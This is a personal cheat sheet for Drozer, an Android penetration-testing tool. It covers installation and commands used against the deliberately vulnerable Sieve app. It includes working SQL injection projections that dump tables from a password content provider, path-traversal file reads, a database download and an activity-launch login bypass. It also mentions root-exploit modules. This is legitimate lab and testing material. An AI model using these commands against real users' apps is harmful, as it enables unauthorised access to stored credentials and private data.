# Drozer
## Setting up drozer

1. Go to the following link and download the latest drozer version
	[Github drozer release page](https://github.com/FSecureLABS/drozer/releases/)
2. Downloading the .deb package - didn't work
		
3. Downloading .whl file and then installing pip for python 2.7
      running for installing drozer
      ```bash
      $ python -m pip install drozer-2.4.4-py2-none-any.whl
      ```
4. confirm that drozer is up and running using the command		
	```bash
	$ drozer
	```
5. before installing the drozer agent, install Genymotion_ARM_Translation 
	[Genymotion-ARM-Translation](https://github.com/m9rco/Genymotion_ARM_Translation/blob/master/package/Genymotion-ARM-Translation_for_8.0.zip)
6. Then download drozer agent from the github and install it in the android device
7. Go to the drozer agent and then enable Embedded Server
8. Then run the following command
	```bash
	$ adb connect 192.168.84.107
	$ adb devices
		//to check whether the device have been connected or not
	$ adb forward tcp:31415 tcp:31415
	```	
9. Then run the follwoing command to start drozer console
	```bash		
	$ drozer console connect
	```
10. Drozer is successfully started
----
## Drozer commands
### To view the list of packages installed on the android console
	```
	dz> run app.package.list
	```
  To select a particular package (use -f with the keywork to search)
	```
	dz> run app.package.list -f drozer 
	```	
  To view the information about a package
	```	
	dz> run app.package.info -a <package_name>
	dz> run app.package.info -a com.mwr.example.sieve
	```		
  To view the attack surface of the applications
	```
	dz> run app.package.attacksurface <package_name>
	dz> run app.package.attacksurface com.mwr.example.sieve
		//shows the available attack surfaces
	```
	output:	
			          3 activities exported
				  0 broadcast receivers exported
				  2 content providers exported
				  2 services exported
				    is debuggable
				    
### Launching activities
	```
	dz> run app.activity.info -a com.mwr.example.sieve
	```
		//shows a list of activities which are exported by the application and also the permission needed to launch the application
		Since the activities is exported and doesn't require any permission, launching it with the help of drozer
	```		
	dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.MainLoginActivity
	```		
			
### To read fro the content provider
	```
	dz> run app.provider.info -a com.mwr.example.sieve
	```
	//lists the exported content providers
				
	To extract the data from content providers, we need to reconstruct content URIs which begins with content:// but rest of the part of the URI is unknown. So, running drozer scanner to find more information about the application
			
### Drozer scanner
	```
	dz> run scanner.provider.finduris -a com.mwr.example.sieve
	```
	//gives a list of content URIs and divide them into a list of accessible content URIs
				
### Reading from content providers, now that we have the content URIs from the above scan
	```
	dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/
	```
	//using the above command, we can also modify the data.
			
### checking for sql injection using the projection
	```
	dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
	```		
		To list down the available tables in sqlite database using the above vulnerability
	```		
	dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
	```		
	
	To retrieve the data of a table
	```		
	dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"
	```		

### File system-backed content providers
	```			
	dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
	dz> run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/prajjwal/tmp/database.db
	```
	// reading file from the application data directory and to write at the operating system's file system
		
### Drozer module to test for simple vulnerability 
	```		
	dz> run scanner.provider.injection -a com.mwr.example.sieve
	dz> run scanner.provider.traversal -a com.mwr.example.sieve
	```		

### To list down exported services
	```
	dz> run app.service.info -a com.mwr.example.sieve
	```
### To list down the available modules in the drozer use, 
	```
	dz> list
	```
---		
### drozer additional modules
	```
	dz> module search cmdclient
	to get more information about the above module, pass -d option
	dz> module search cmdclient -d
	```
### installing modules
	```
	dz> module install cmdclient	
	```

---
|namespace|description|
|:-----------------|:---------------------------------------------------------------------|
|app.activity | Find and interact with activities exported by apps.|
|app.broadcast | Find and interact with broadcast receivers exported by apps.|
|app.package | Find packages installed on a device, and collect information about them.|
|app.provider | Find and interact with content providers exported by apps.|
|app.service | Find and interact with services exported by apps.|
|auxiliary | Useful tools that have been ported to drozer.|
|exploit.pilfer | Public exploits that extract sensitive information through unprotected content providers or SQL injection.|
|exploit.root | Public root exploits.|
|information | Extract additional information about a device.|
|scanner | Find common vulnerabilities with automatic scanners.|
|shell | Interact with the underlying Linux OS.|
|tools.file | Copy files to and from the device.|
|tools.setup | Install handy utilities on the device, including busybox.|
